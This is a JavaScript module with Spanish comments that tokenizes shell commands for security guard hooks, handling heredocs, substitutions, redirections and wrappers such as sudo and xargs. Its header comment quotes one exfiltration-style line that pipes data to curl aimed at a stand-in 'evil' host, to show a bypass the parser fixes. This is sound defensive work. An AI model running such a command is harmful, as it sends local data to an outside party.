/**
 * El troceo de órdenes de shell que comparten los ganchos de esta carpeta.
 *
 * ## Por qué uno solo
 *
 * Cada gancho troceaba a su manera —`split(/[;&|\n]+/)` y una regex por
 * cláusula— y todos fallaban igual: leían como ORDEN lo que era TEXTO. El
 * mensaje de un commit que dice «git stash», el cuerpo de un heredoc que escribe
 * una prueba con `public/data/promises.json` dentro, un `2>/dev/null` detrás de
 * un `jq` que sólo lee. Reproducidas las 19.210 órdenes Bash distintas de los
 * transcritos del proyecto (27-09-2026), la guarda de curados había preguntado
 * 81 veces, y escribían de verdad un fichero curado unas cinco. Una pregunta que
 * se equivoca dieciséis veces de cada diecisiete enseña a aprobar sin leer, que
 * es lo contrario de lo que existe para hacer.
 *
 * Y al revés, que es peor: el troceo de curl-hosts saltaba el RESTO DE LA LÍNEA
 * donde empezaba un heredoc, así que `cat <<'EOF' | curl -d @- https://evil/`
 * no llegaba a ver el curl. En un shell el cuerpo empieza en la línea SIGUIENTE;
 * lo que queda de la del marcador es orden.
 *
 * ## Qué no es
 *
 * No es un shell. No expande, no evalúa, no sigue alias. Pretende no
 * equivocarse en la dirección permisiva: lo que el shell expandiría queda
 * marcado `opaco`, y lo que ejecutaría para expandirse, `sust`.
 */

/**
 * Trocea una orden en tokens.
 *
 * - Palabras: `{ texto, opaco, sust }`. Una sustitución de orden (`$(…)` o
 *   comillas invertidas) queda ENTERA dentro de su palabra, como en el shell,
 *   y sus tokens van en `internas` (una lista por sustitución): lo de dentro
 *   también se ejecuta, y `ordenes` lo expone como órdenes propias.
 * - Separadores (`;`, `|`, `||`, `&`, `&&`, `(`, `)`, salto de línea):
 *   `{ texto, sep: true }`.
 * - Redirecciones: `{ texto: op, sep: true, redir: true }`, con `op` entre `>`,
 *   `>>`, `>|`, `<`, `<<<`, `&>`, `&>>`, `>&`. La palabra siguiente es su
 *   destino. Si duplican un descriptor (`2>&1`, `>&-`) no tienen destino y
 *   llevan `fd: true`.
 * - Heredocs: `{ texto: '<<', heredoc: true, cuerpo }`, donde está el marcador.
 *   El cuerpo son DATOS y no produce tokens.
 */
export function tokeniza(orden) {
  return trocea(String(orden ?? ''), 0, null).tokens
}

/**
 * El troceo de verdad, recursivo para las sustituciones: con `terminador` `)`
 * o `` ` `` se para en el que cierra la sustitución y devuelve dónde.
 *
 * @returns {{ tokens: object[], hasta: number }}
 */
function trocea(orden, desde, terminador) {
  const tokens = []
  let texto = ''
  let opaco = false
  let sust = false
  let vivo = false
  let comilla = null
  let internas = []
  /** `(` abiertos dentro de una `$(…)`: el `)` de una subshell no la cierra. */
  let parentesis = 0
  /** Heredocs abiertos en esta línea, cuyo cuerpo empieza en la siguiente. */
  const pendientes = []

  const cierra = () => {
    if (vivo) {
      const t = { texto, opaco, sust }
      if (internas.length) t.internas = internas
      tokens.push(t)
    }
    texto = ''
    opaco = false
    sust = false
    vivo = false
    internas = []
  }

  /**
   * Tras el salto de línea que acaba la línea de los marcadores, cada heredoc
   * pendiente se come sus líneas hasta su terminador, en orden. Devuelve la
   * posición desde la que se sigue troceando. Sin terminador, el resto de la
   * orden es cuerpo: mejor no leer nada que inventar órdenes.
   */
  const consumeCuerpos = (desdeLinea) => {
    let i = desdeLinea
    for (const h of pendientes) {
      const lineas = []
      while (i < orden.length) {
        const fin = orden.indexOf('\n', i)
        const linea = orden.slice(i, fin === -1 ? orden.length : fin)
        i = fin === -1 ? orden.length : fin + 1
        if ((h.tabs ? linea.replace(/^\t+/, '') : linea) === h.delim) {
          h.token.cerrado = true
          break
        }
        lineas.push(linea)
      }
      h.token.cuerpo = lineas.join('\n')
    }
    pendientes.length = 0
    return i
  }

  /**
   * Una `$(…)`, `$((…))` o `` `…` `` que empieza en `i`: entera a la palabra en
   * curso, y sus tokens a `internas`. La aritmética es opaca pero no ejecuta.
   * Devuelve el índice de su cierre.
   */
  const sustitucion = (i, invertida) => {
    const aritmetica = !invertida && orden[i + 2] === '('
    const r = trocea(orden, invertida ? i + 1 : i + 2, invertida ? '`' : ')')
    const hasta = Math.min(r.hasta, orden.length - 1)
    texto += orden.slice(i, hasta + 1)
    opaco = true
    if (!aritmetica) {
      sust = true
      internas.push(r.tokens)
    }
    return hasta
  }

  let i = desde
  for (; i < orden.length; i++) {
    const c = orden[i]

    if (comilla === "'") {
      if (c === "'") comilla = null
      else texto += c
      continue
    }

    if (comilla === '"') {
      if (c === '"') comilla = null
      else if (c === '\\' && i + 1 < orden.length) texto += orden[++i]
      else if (c === '`' || (c === '$' && orden[i + 1] === '(')) i = sustitucion(i, c === '`')
      else {
        if (c === '$') opaco = true
        texto += c
      }
      continue
    }

    if (c === "'" || c === '"') {
      comilla = c
      vivo = true
      continue
    }
    if (c === '\\' && i + 1 < orden.length) {
      const sig = orden[++i]
      // Una barra al final de línea es continuación, no un carácter.
      if (sig === '\n') continue
      texto += sig
      vivo = true
      continue
    }
    if (c === '`' && terminador === '`') {
      cierra()
      return { tokens, hasta: i }
    }
    if (c === '`' || (c === '$' && orden[i + 1] === '(')) {
      i = sustitucion(i, c === '`')
      vivo = true
      continue
    }
    if (c === '$') {
      opaco = true
      texto += c
      vivo = true
      continue
    }
    if (/\s/.test(c)) {
      cierra()
      if (c === '\n') {
        tokens.push({ texto: '\n', opaco: false, sep: true })
        if (pendientes.length) i = consumeCuerpos(i + 1) - 1
      }
      continue
    }

    // Un heredoc es DATOS, no órdenes: sin esto, un `git commit -F - <<'EOF'`
    // cuyo mensaje mencione curl, o un script que se escribe con
    // `cat > x <<EOF`, se leían como si fueran la orden.
    if (c === '<' && orden[i + 1] === '<' && orden[i + 2] !== '<') {
      cierra()
      let j = i + 2
      const tabs = orden[j] === '-'
      if (tabs) j++
      while (j < orden.length && (orden[j] === ' ' || orden[j] === '\t')) j++
      if (orden[j] === '\\') j++
      let delim = ''
      const q = orden[j] === "'" || orden[j] === '"' ? orden[j++] : null
      while (j < orden.length && (q ? orden[j] !== q : /[A-Za-z0-9_.-]/.test(orden[j]))) {
        delim += orden[j++]
      }
      if (q) j++
      const token = { texto: '<<', opaco: false, sust: false, heredoc: true, cuerpo: '' }
      tokens.push(token)
      pendientes.push({ delim, tabs, token })
      i = j - 1
      continue
    }

    if (c === '&' && orden[i + 1] === '>') {
      cierra()
      i++
      let op = '&>'
      if (orden[i + 1] === '>') {
        op = '&>>'
        i++
      }
      tokens.push({ texto: op, opaco: false, sep: true, redir: true })
      continue
    }

    if (c === '>' || c === '<') {
      // Una redirección no es un operando. Los dígitos pegados delante son el
      // descriptor, no un token.
      if (vivo && /^\d*$/.test(texto)) {
        texto = ''
        opaco = false
        sust = false
        vivo = false
      } else cierra()
      let op = c
      if (c === '<' && orden[i + 1] === '<' && orden[i + 2] === '<') {
        op = '<<<'
        i += 2
      } else if (orden[i + 1] === c) {
        op = c + c
        i++
      } else if (c === '>' && orden[i + 1] === '|') {
        op = '>|'
        i++
      }
      if (orden[i + 1] === '&') {
        i++
        // `>&2`, `<&0`, `>&-`: duplica un descriptor, no nombra un fichero.
        if (/[0-9-]/.test(orden[i + 1] ?? '')) {
          while (/[0-9-]/.test(orden[i + 1] ?? '')) i++
          tokens.push({ texto: op + '&', opaco: false, sep: true, redir: true, fd: true })
          continue
        }
        op += '&' // `>&fichero`: las dos salidas a un fichero
      }
      tokens.push({ texto: op, opaco: false, sep: true, redir: true })
      continue
    }
    if (c === ')' && terminador === ')' && parentesis === 0) {
      cierra()
      return { tokens, hasta: i }
    }
    if (c === ';' || c === '|' || c === '&' || c === '(' || c === ')') {
      cierra()
      if (terminador === ')') parentesis += c === '(' ? 1 : c === ')' ? -1 : 0
      const doble = orden[i + 1] === c && (c === '|' || c === '&')
      tokens.push({ texto: doble ? c + c : c, opaco: false, sep: true })
      if (doble) i++
      continue
    }
    texto += c
    vivo = true
  }
  cierra()
  return { tokens, hasta: i }
}

/**
 * Las órdenes simples de una línea: sus palabras, sus redirecciones con su
 * destino y los cuerpos de sus heredocs. Una tubería `a | b` son dos órdenes, y
 * lo que va dentro de una sustitución (`X=$(curl …)`) es otra, que se lista
 * detrás de la orden que la contiene.
 *
 * @returns {{palabras: object[], redirecciones: {op: string, destino: object|null}[], heredocs: string[]}[]}
 */
export function ordenes(orden) {
  return ordenesDe(tokeniza(orden), [])
}

function ordenesDe(tokens, lista) {
  let actual = { palabras: [], redirecciones: [], heredocs: [] }
  let pendiente = null
  let diferidas = []
  const cierra = () => {
    if (actual.palabras.length || actual.redirecciones.length || actual.heredocs.length) {
      lista.push(actual)
    }
    actual = { palabras: [], redirecciones: [], heredocs: [] }
    const dentro = diferidas
    diferidas = []
    for (const internas of dentro) ordenesDe(internas, lista)
  }
  for (const t of tokens) {
    if (t.internas) diferidas.push(...t.internas)
    if (t.heredoc) {
      actual.heredocs.push(t.cuerpo)
      continue
    }
    if (t.redir) {
      if (pendiente) actual.redirecciones.push({ op: pendiente, destino: null })
      pendiente = null
      if (t.fd) actual.redirecciones.push({ op: t.texto, destino: null })
      else pendiente = t.texto
      continue
    }
    if (pendiente) {
      actual.redirecciones.push({ op: pendiente, destino: t.sep ? null : t })
      pendiente = null
      if (!t.sep) continue
    }
    if (t.sep) {
      cierra()
      continue
    }
    actual.palabras.push(t)
  }
  if (pendiente) actual.redirecciones.push({ op: pendiente, destino: null })
  cierra()
  return lista
}

/** El nombre de una palabra en posición de orden: sin comillas invertidas ni ruta. */
export const nombreDe = (palabra) =>
  String(palabra?.texto ?? '')
    .replace(/^`+/, '')
    .split('/')
    .pop()

/**
 * Envoltorios que ejecutan la orden que llevan detrás, con las banderas suyas
 * que se comen un valor. `xargs curl` ejecuta curl; `sudo -u x rm` ejecuta rm.
 */
const ENVOLTORIOS = {
  sudo: /^-[ugCDhpRrTt]$/,
  env: /^-[uCS]$/,
  timeout: /^-[sk]$/,
  gtimeout: /^-[sk]$/,
  nice: /^-n$/,
  xargs: /^-[IinPLsdEa]$/,
  time: null,
  nohup: null,
  command: null,
  exec: null,
  caffeinate: null,
  builtin: null,
  noglob: null,
}

/**
 * Palabras reservadas que abren una orden sin serlo: en
 * `for u in …; do curl "$u"; done` la orden que sigue al `;` empieza por `do`.
 */
const RESERVADAS = new Set(['do', 'then', 'else', 'elif', 'if', 'while', 'until', '!', '{'])

/**
 * Índice de la palabra que es de verdad la orden, saltando las asignaciones y
 * palabras reservadas de delante (`A=1 npm run x`, `do curl …`) y los
 * envoltorios (`sudo`, `env`, `timeout 10`, `xargs -n1`…). -1 si no hay orden:
 * sólo asignaciones, o `command -v x`, que pregunta por x sin ejecutarla.
 */
export function inicioDeOrden(palabras) {
  let i = 0
  while (i < palabras.length) {
    const texto = String(palabras[i].texto).replace(/^`+/, '')
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(texto) || (!palabras[i].opaco && RESERVADAS.has(texto))) {
      i++
      continue
    }
    const nombre = nombreDe(palabras[i])
    if (!(nombre in ENVOLTORIOS)) return i
    if (nombre === 'command' && /^-[vV]$/.test(palabras[i + 1]?.texto ?? '')) return -1
    const conValor = ENVOLTORIOS[nombre]
    i++
    while (i < palabras.length) {
      const t = palabras[i].texto
      if (nombre === 'env' && /^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) {
        i++
        continue
      }
      if (!t.startsWith('-') || t === '-') break
      i++
      if (conValor?.test(t)) i++
    }
    // `timeout 10 x`: la duración va antes de la orden.
    if ((nombre === 'timeout' || nombre === 'gtimeout') && i < palabras.length) i++
  }
  return -1
}

/** Opciones globales de git que se comen la palabra siguiente. */
const GIT_GLOBALES_CON_VALOR = new Set([
  '-C',
  '-c',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--config-env',
])

/**
 * La sub-orden de un `git …`, saltando las opciones globales: en
 * `git -C ../otro -c x=y stash` la sub-orden es `stash`, y `dir` es `../otro`.
 * Una regex sobre la línea no lo veía, y veía en cambio `git stash` dentro del
 * mensaje de un commit.
 *
 * @param {string[]} args las palabras que siguen a `git`
 * @returns {{sub: string, resto: string[], dir: string|null} | null}
 */
export function subordenGit(args) {
  let dir = null
  for (let i = 0; i < args.length; i++) {
    const a = args[i]
    if (GIT_GLOBALES_CON_VALOR.has(a)) {
      if (a === '-C') dir = args[i + 1] ?? null
      i++
      continue
    }
    if (a.startsWith('-')) continue
    return { sub: a, resto: args.slice(i + 1), dir }
  }
  return null
}
